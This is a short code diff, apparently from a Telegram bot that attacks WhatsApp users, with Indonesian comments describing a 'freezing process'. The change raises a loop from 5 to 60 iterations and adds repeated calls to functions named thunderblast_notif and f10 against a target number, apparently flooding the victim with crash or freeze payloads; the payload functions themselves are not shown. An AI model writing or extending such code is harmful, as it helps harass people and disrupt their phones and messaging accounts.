@@ -612,12 +612,18 @@ bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 60; i++) {
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
     await thunderblast_notif(target);
     await thunderblast_notif(target);
-    await thunderblast_notif(target);
-    await thunderblast_notif(target);
-    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
